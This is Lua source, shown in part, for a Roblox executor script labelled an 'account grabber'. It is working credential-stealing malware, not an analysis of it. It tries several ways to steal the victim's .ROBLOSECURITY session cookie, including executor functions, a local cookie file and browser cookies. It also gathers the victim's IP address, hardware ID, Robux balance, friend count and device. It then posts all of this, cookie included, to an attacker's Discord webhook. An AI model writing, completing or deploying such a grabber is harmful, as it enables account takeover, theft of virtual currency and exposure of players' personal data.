...
--// Delta Executor - Enhanced Player Account Grabber
...
--// Robust HTTP Request for Webhooks
local function sendWebhook(data)
    local payload = HttpService:JSONEncode(data)
    
    -- Try standard request first (Delta/Toxic/etc usually support this)
    ...
    if not success then
        -- Fallback for executors that use http_request (e.g., older Delta, Krnl legacy)
        pcall(function()
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
    ...
    -- Fallback if both fail: try game:HttpGet (slower but sometimes works)
    if not success then
        pcall(function()
            local url = WEBHOOK_URL .. "?wait=true"
            game:HttpGet(url, false, {
...
--// Grab ROBLOSECURITY cookie with multiple methods
local function grabCookie()
    local cookie = ""

    -- Method 1: getroblosecurity (Most common in Delta/Toxic)
    ...
    -- Method 2: get_cookie (Alternative function name)
    if cookie == "" and get_cookie then
        pcall(function()
            cookie = get_cookie()
        end)
    end

    -- Method 3: readfile from LocalStorage (Windows specific path)
    if cookie == "" and isfile and readfile then
        local cookiePath = os.getenv("LOCALAPPDATA") 
            .. "\\Roblox\\LocalStorage\\RobloxCookies.dat"
        if isfile(cookiePath) then
            pcall(function()
                local data = readfile(cookiePath)
                -- Simple regex-like extraction for .ROBLOSECURITY=...;
                local match = string.match(data, "%-%.ROBLOSECURITY=%s*([^\;]+)")
                if match then
                    cookie = match
                end
            end)
    ...
    -- Method 4: getbrowser cookies (If available)
    if cookie == "" and getbrowser then
        pcall(function()
            local browser = getbrowser()
            if browser then
                local cookies = browser:GetCookies("https://www.roblox.com")
    ...
    return cookie or "Failed to grab cookie"
end
...
local function getIP()
    local ip = "Unknown"
    pcall(function()
        -- Using a simple JSON API to get public IP
        local data = game:HttpGet("https://api.ipify.org?format=json")
...
local function getPlayerInfo()
    ...
    -- Account Age in Days
    local accountAgeMs = os.time() - LocalPlayer.AccountAge * 86400 -- Approximation if AccountAge property isn't direct days
    -- Actually, LocalPlayer.AccountAge is usually just the age. Let's use the property directly if available, else calculate from creation.
    -- Roblox API is better for this, but let's stick to local data first.
    info.AccountAge = "N/A" 
    pcall(function()
        -- Attempting to get account age via API for accuracy
        local ageUrl = "https://users.roblox.com/v1/users/" .. tostring(info.UserId)
        local resp = game:HttpGet(ageUrl)
        local decoded = HttpService:JSONDecode(resp)
        if decoded then
            info.AccountAge = decoded.created -- ISO Date string
        end
    end)

    -- Membership Type
    info.MembershipType = tostring(LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Premium" or LocalPlayer.MembershipType == Enum.MembershipType.PremiumPlus and "PP" or "None")

    -- Robux Balance
    pcall(function()
        local balanceUrl = "https://economy.roblox.com/v1/users/" .. tostring(info.UserId) .. "/currency"
        local resp = game:HttpGet(balanceUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.Robux = decoded and decoded.robux or "Unknown"
    end)

    -- Friends Count
    pcall(function()
        local friendsUrl = "https://friends.roblox.com/v1/users/" .. tostring(info.UserId) .. "/friends/count"
        local resp = game:HttpGet(friendsUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.FriendsCount = decoded and decoded.count or "Unknown"
    end)

    -- Avatar Thumbnail
    pcall(function()
        local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. tostring(info.UserId) .. "&size=420x420&format=Png&isCircular=false"
        local resp = game:HttpGet(thumbUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.AvatarURL = decoded and decoded.data and decoded.data[1] and decoded.data[1].imageUrl or ""
    end)
    ...
    -- Hardware ID / Executor Info
    info.HWID = "N/A"
    if gethwid then
        pcall(function() info.HWID = gethwid() end)
    elseif getExecutor and getExecutor() then
         info.ExecutorName = getExecutor().name or "Unknown"
    elseif getexecutorname then
        info.ExecutorName = getexecutorname()
    else
        info.ExecutorName = "Unknown/Standard"
    end

    -- Device Info
    info.DeviceType = GuiService.Platform == Enum.Platform.IOS and "iOS" 
                    or GuiService.Platform == Enum.Platform.ANDROID and "Android"
                    or GuiService.Platform == Enum.Platform.XBOX and "Xbox"
                    or GuiService.Platform == Enum.Platform.TVOS and "TV"
                    or "PC/Mobile"
...
local function buildEmbed(playerInfo, cookie)
    local fields = {
        ...
        { name = "📅 Account Created",value = "```" .. (playerInfo.AccountAge or "N/A") .. "```",   inline = false },
        ...
        { name = "📱 Device",         value = "```" .. (playerInfo.DeviceType or "Unknown") .. "```", inline = true },
        { name = "🌐 IP Address",     value = "```" .. (playerInfo.IP or "N/A") .. "```", inline = true },
        { name = "🎮 Game",           value = "```" .. (playerInfo.GameName or "Unknown") .. "```\nJob: ```" .. tostring(playerInfo.JobId) .. "```", inline = false },
        { name = "💻 Executor",       value = "```" .. (playerInfo.ExecutorName or playerInfo.HWID or "N/A") .. "```", inline = false },
    }

    -- Cookie field (Split if too long for Discord embed)
    local cookieStr = tostring(cookie)
    if cookieStr and cookieStr ~= "" and cookieStr ~= "Failed to grab cookie" then
        local cookieChunks = {}
        for i = 1, #cookieStr, 900 do
            table.insert(cookieChunks, cookieStr:sub(i, i + 899))
        end
    ...
    local embed = {
        ...
        footer = { text = "Delta Grabber v2 | " .. os.date("%Y-%m-%d %H:%M:%S") },
